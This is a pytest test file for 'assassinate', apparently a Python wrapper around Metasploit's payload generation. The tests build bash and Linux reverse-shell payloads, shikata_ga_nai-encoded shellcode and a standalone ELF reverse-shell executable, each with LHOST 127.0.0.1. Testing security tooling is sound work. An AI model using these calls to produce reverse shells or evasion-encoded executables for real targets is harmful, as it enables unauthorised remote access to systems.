"""Tests for payload generation (forge) functions - Tier 2.

These tests verify the low-level msf module payload generation API.
"""

import pytest

import assassinate


class TestListPayloads:
    """Tests for list_payloads()."""

    def test_lists_payloads(self, msf_init):
        """Should list available payloads."""
        payloads = assassinate.list_payloads()

        assert len(payloads) > 0, "Should have payloads available"
        print(f"✓ Found {len(payloads)} payloads")

        # Check for expected payload types
        has_linux = any("linux" in p for p in payloads)
        has_windows = any("windows" in p for p in payloads)
        has_cmd = any(p.startswith("cmd/") for p in payloads)

        assert has_linux, "Should have Linux payloads"
        assert has_windows, "Should have Windows payloads"
        assert has_cmd, "Should have cmd/ payloads"

        print("✓ Has Linux, Windows, and cmd payloads")


class TestForgePayload:
    """Tests for forge_payload() - raw payload generation."""

    def test_generates_bash_payload(self, msf_init):
        """Should generate a bash reverse shell payload."""
        payload = assassinate.forge_payload(
            "cmd/unix/reverse_bash",
            {"LHOST": "127.0.0.1", "LPORT": 4444},
        )

        assert isinstance(payload, bytes), "Should return bytes"
        assert len(payload) > 0, "Payload should not be empty"
        print(f"✓ Generated cmd/unix/reverse_bash: {len(payload)} bytes")

        # Bash payload should contain shell commands
        payload_str = payload.decode("utf-8", errors="replace")
        assert "bash" in payload_str or "sh" in payload_str, "Should contain shell reference"
        print(f"  Preview: {payload_str[:80]}...")

    def test_generates_linux_shellcode(self, msf_init):
        """Should generate binary Linux shellcode."""
        payload = assassinate.forge_payload(
            "linux/x64/shell_reverse_tcp",
            {"LHOST": "127.0.0.1", "LPORT": 4444},
        )

        assert isinstance(payload, bytes), "Should return bytes"
        assert len(payload) > 10, "Shellcode should have meaningful size"
        print(f"✓ Generated linux/x64/shell_reverse_tcp: {len(payload)} bytes")


class TestForgeEncoded:
    """Tests for forge_encoded() - encoded payload generation."""

    def test_encodes_with_shikata_ga_nai(self, msf_init):
        """Should encode payload with shikata_ga_nai encoder."""
        # Generate raw for comparison
        raw = assassinate.forge_payload(
            "linux/x86/shell_reverse_tcp",
            {"LHOST": "127.0.0.1", "LPORT": 4444},
        )
        print(f"✓ Raw payload: {len(raw)} bytes")

        # Generate encoded
        encoded = assassinate.forge_encoded(
            "linux/x86/shell_reverse_tcp",
            encoder="x86/shikata_ga_nai",
            iterations=3,
            options={"LHOST": "127.0.0.1", "LPORT": 4444},
        )

        assert isinstance(encoded, bytes), "Should return bytes"
        assert len(encoded) > 0, "Encoded payload should not be empty"
        print(f"✓ Encoded payload (shikata_ga_nai x3): {len(encoded)} bytes")

        # Encoded MUST differ from raw
        assert raw != encoded, "Encoded payload MUST differ from raw"
        print(f"  Size change: {len(raw)} -> {len(encoded)} bytes")

    def test_no_encoder_returns_raw(self, msf_init):
        """Should return raw payload when no encoder specified."""
        raw = assassinate.forge_payload(
            "linux/x86/shell_reverse_tcp",
            {"LHOST": "127.0.0.1", "LPORT": 4444},
        )

        # forge_encoded with no encoder
        result = assassinate.forge_encoded(
            "linux/x86/shell_reverse_tcp",
            encoder=None,
            iterations=None,
            options={"LHOST": "127.0.0.1", "LPORT": 4444},
        )

        assert raw == result, "No encoder should return raw payload"
        print("✓ No encoder returns raw payload")


class TestForgeExecutable:
    """Tests for forge_executable() - standalone executable generation."""

    def test_generates_linux_elf(self, msf_init):
        """Should generate a Linux ELF executable."""
        exe = assassinate.forge_executable(
            "linux/x64/shell_reverse_tcp",
            platform="linux",
            arch="x64",
            options={"LHOST": "127.0.0.1", "LPORT": 4444},
        )

        assert isinstance(exe, bytes), "Should return bytes"
        assert len(exe) > 120, "ELF should be larger than template (120 bytes)"
        print(f"✓ Generated Linux x64 ELF: {len(exe)} bytes")

        # Verify ELF magic bytes
        assert exe[:4] == b"\x7fELF", "Should have ELF magic bytes"
        print(f"  Magic: {exe[0]:02x} {exe[1]:02x} {exe[2]:02x} {exe[3]:02x}")


class TestForgeErrors:
    """Tests for error handling in forge functions."""

    def test_invalid_payload_raises(self, msf_init):
        """Should raise error for non-existent payload."""
        with pytest.raises(assassinate.AssassinateError):
            assassinate.forge_payload("nonexistent/payload/name", {})

        print("✓ Invalid payload raises AssassinateError")

    def test_invalid_encoder_raises(self, msf_init):
        """Should raise error for non-existent encoder."""
        with pytest.raises(assassinate.AssassinateError):
            assassinate.forge_encoded(
                "linux/x86/shell_reverse_tcp",
                encoder="nonexistent/encoder",
                iterations=1,
                options={"LHOST": "127.0.0.1", "LPORT": 4444},
            )

        print("✓ Invalid encoder raises AssassinateError")
